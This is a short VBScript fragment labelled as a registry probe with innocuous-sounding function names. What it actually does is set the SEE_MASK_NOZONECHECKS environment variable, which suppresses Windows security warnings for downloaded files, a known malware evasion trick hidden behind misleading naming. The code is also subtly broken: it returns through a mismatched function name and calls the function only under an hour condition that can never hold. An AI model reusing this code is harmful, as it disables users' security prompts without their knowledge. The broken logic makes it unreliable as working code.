' --- registry probe ---
Function LoadProfileSegment56()
On Error Resume Next
  Dim strBlock200,strKey20,strData70
  Set strBlock200=CreateObject("WScript.Shell")
  strKey20=strBlock200.ExpandEnvironmentStrings("%TEMP%")
  strData70=strBlock200.ExpandEnvironmentStrings("%ProgramFiles%")
  If Len(strKey20)>0 And Len(strData70)>0 Then
    strBlock200.Environment("PROCESS")("SEE_MASK_NOZONECHECKS")="1"
  End If
  If Err.Number<>0 Then
    Err.Clear
    ParseRegistryChunk79=1
    Exit Function
  End If
  ParseRegistryChunk79=0
End Function

If Hour(Now) > 23 Then
  Call LoadProfileSegment56()
End If


